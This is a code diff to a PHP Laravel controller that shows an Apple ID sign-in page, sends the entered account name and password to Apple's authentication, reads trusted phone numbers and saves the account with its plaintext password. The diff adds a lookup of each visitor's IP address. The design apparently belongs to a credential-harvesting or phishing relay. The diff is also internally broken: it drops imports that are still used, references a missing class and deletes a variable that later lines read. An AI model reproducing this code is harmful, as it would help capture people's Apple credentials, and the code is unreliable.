@@ -9,6 +9,7 @@ use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
 use App\Events\AccountAuthFailEvent;
 use App\Events\AccountAuthSuccessEvent;
 use App\Events\AccountLoginSuccessEvent;
+use App\Http\Integrations\IpConnector\IpConnector;
 use App\Http\Requests\VerifyAccountRequest;
 use App\Http\Requests\VerifyCodeRequest;
 use App\Jobs\BindAccountPhone;
@@ -35,8 +36,6 @@ use Illuminate\Validation\ValidationException;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
 use Psr\Log\LoggerInterface;
-use Saloon\Exceptions\Request\FatalRequestException;
-use Saloon\Exceptions\Request\RequestException;
 
 class IndexController extends Controller
 {
@@ -72,6 +71,19 @@ class IndexController extends Controller
     public function signin(): Response
     {
         $guid = sha1(microtime());
+
+        $IpConnector = new IpConnector();
+        $apple = $this->appleFactory->create($guid);
+
+        try {
+
+            $ipaddress = $IpConnector->ipaddress(new PconLineRequest(ip: $this->request->ip()));
+            $apple->getUser()->add('ipaddress',$ipaddress);
+
+            Log::info('获取IP地址成功',['ipaddress' => $ipaddress->all()]);
+        } catch (FatalRequestException|RequestException $e) {
+
+        }
 
         return response()
             ->view('index/signin')
@@ -131,12 +143,11 @@ class IndexController extends Controller
             $accountName = $this->formatPhone($accountName);
         }
 
-        //毫秒时间戳
         $guid = $request->cookie('Guid');
 
        $apple->authLogin($accountName, $password);
 
-        $response = $apple->auth();
+        $apple->getUser()->add('accountName', $accountName);
 
         $phoneList = $response->getTrustedPhoneNumbers();
         if ($phoneList->isNotEmpty()){
@@ -155,10 +166,7 @@ class IndexController extends Controller
             'account' => $accountName,
         ],[ 'password' => $password]);
 
-        $apple->getAppleIdConnector()
-            ->getRepositories()
-            ->add('account',$account)
-            ->add('Guid', $guid);
+        $apple->getUser()->add('account', $account);
 
         $error = $response->firstAuthServiceError()?->getMessage();
         Session::flash('Error',$error);
